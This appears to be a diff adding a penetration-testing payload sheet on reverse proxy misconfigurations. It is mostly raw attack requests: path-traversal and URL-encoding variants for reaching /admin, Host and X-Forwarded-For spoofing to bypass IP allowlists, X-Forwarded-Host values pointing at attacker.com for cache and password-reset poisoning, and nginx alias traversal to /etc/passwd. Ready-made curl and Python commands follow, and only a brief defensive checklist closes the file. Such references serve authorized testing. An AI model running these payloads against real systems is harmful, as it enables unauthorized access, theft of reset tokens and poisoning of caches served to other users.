@@ -1,0 +1,266 @@
+# Reverse Proxy Misconfiguration
+
+## ========================================
+## PATH TRAVERSAL
+## ========================================
+
+# Double slashes
+//admin
+///admin
+////admin
+
+# Dot segments
+/./admin
+/././admin
+/api/../admin
+/app/./admin
+
+# Mixed
+/.//admin
+//.//admin
+
+## ========================================
+## HOST HEADER ATTACKS
+## ========================================
+
+# Internal access
+Host: localhost
+Host: 127.0.0.1
+Host: 0.0.0.0
+Host: [::1]
+Host: 0
+
+# Internal hostnames
+Host: internal
+Host: admin
+Host: backend
+Host: internal-server
+Host: app-server
+
+## ========================================
+## X-FORWARDED HEADERS
+## ========================================
+
+# IP spoofing
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+
+# Multiple IPs
+X-Forwarded-For: 127.0.0.1, 10.0.0.1
+X-Forwarded-For: 127.0.0.1, 127.0.0.1
+
+## ========================================
+## X-FORWARDED-HOST
+## ========================================
+
+# Cache poisoning
+X-Forwarded-Host: attacker.com
+X-Forwarded-Host: evil.com
+
+# Password reset poisoning
+X-Forwarded-Host: attacker.com
+# Password reset link: http://attacker.com/reset?token=...
+
+## ========================================
+## X-ORIGINAL-URL / X-REWRITE-URL
+## ========================================
+
+# Bypass access controls
+GET /public HTTP/1.1
+X-Original-URL: /admin
+
+GET / HTTP/1.1
+X-Rewrite-URL: /admin
+
+## ========================================
+## PROTOCOL SMUGGLING
+## ========================================
+
+# X-Forwarded-Proto
+X-Forwarded-Proto: https
+# Forces backend to think request is HTTPS
+
+X-Forwarded-Proto: http
+# Downgrades to HTTP
+
+## ========================================
+## PORT MANIPULATION
+## ========================================
+
+# X-Forwarded-Port
+X-Forwarded-Port: 443
+X-Forwarded-Port: 8080
+
+## ========================================
+## CACHE POISONING
+## ========================================
+
+# Poison with malicious host
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com
+
+# Cached response includes attacker.com resources
+# Affects all users
+
+## ========================================
+## NGINX MISCONFIGURATIONS
+## ========================================
+
+# Alias misconfiguration
+# If: location /static { alias /var/www/static/; }
+GET /static../etc/passwd
+
+# Merge_slashes off
+GET //admin
+
+## ========================================
+## APACHE MISCONFIGURATIONS
+## ========================================
+
+# Mod_rewrite bypass
+GET /index.php/admin
+GET /./admin
+
+## ========================================
+## URL NORMALIZATION BYPASS
+## ========================================
+
+# Different encodings
+/admin
+/%61dmin
+/ad%6Din
+/%2e/admin
+
+# Case sensitivity
+/Admin
+/ADMIN
+/aDmIn
+
+## ========================================
+## ABSOLUTEURI CONFUSION
+## ========================================
+
+# HTTP request smuggling
+GET http://internal-server/admin HTTP/1.1
+Host: target.com
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Test path traversal
+GET //admin
+GET /./admin
+GET /api/../admin
+
+# 2. Test host header
+Host: localhost
+Host: 127.0.0.1
+Host: internal
+
+# 3. Test X-Forwarded headers
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: attacker.com
+
+# 4. Test X-Original-URL
+X-Original-URL: /admin
+
+# 5. Test cache poisoning
+X-Forwarded-Host: evil.com
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Access bypass
+GET /public HTTP/1.1
+X-Original-URL: /admin
+# Backend sees /admin, proxy sees /public
+
+# Example 2: IP whitelist bypass
+GET /admin HTTP/1.1
+X-Forwarded-For: 127.0.0.1
+# Backend thinks request from localhost
+
+# Example 3: Cache poisoning
+GET / HTTP/1.1
+X-Forwarded-Host: attacker.com
+# Cache stores response with attacker.com links
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing with curl
+curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
+curl -H "X-Original-URL: /admin" http://target.com/public
+curl -H "Host: localhost" http://target.com/admin
+
+# Burp Suite
+# Modify headers in Repeater
+
+# Custom scripts
+import requests
+headers = {'X-Forwarded-For': '127.0.0.1'}
+r = requests.get('http://target.com/admin', headers=headers)
+
+## ========================================
+## COMMON VULNERABILITIES
+## ========================================
+
+# Trusting X-Forwarded headers
+# Poor URL normalization
+# Inconsistent ACL enforcement
+# Cache poisoning
+# Path confusion
+# Host header injection
+
+## ========================================
+## BYPASS COMBINATIONS
+## ========================================
+
+# Combine multiple techniques
+GET /./admin HTTP/1.1
+Host: localhost
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+
+## ========================================
+## NGINX SPECIFIC
+## ========================================
+
+# Location block bypass
+# If: location /admin { deny all; }
+GET //admin
+GET /./admin
+GET /Admin
+
+# Alias traversal
+# location /files { alias /var/www/files/; }
+GET /files../etc/passwd
+
+## ========================================
+## HAProxy SPECIFIC
+## ========================================
+
+# ACL bypass
+GET /admin HTTP/1.1
+X-Original-URI: /admin
+
+## ========================================
+## DEFENSE TESTING
+## ========================================
+
+# Verify:
+- Proper URL normalization
+- Strict path validation
+- Don't trust X-Forwarded headers blindly
+- Consistent ACL enforcement
+- Cache key includes relevant headers
+- Host header validation
+- Reject ambiguous requests
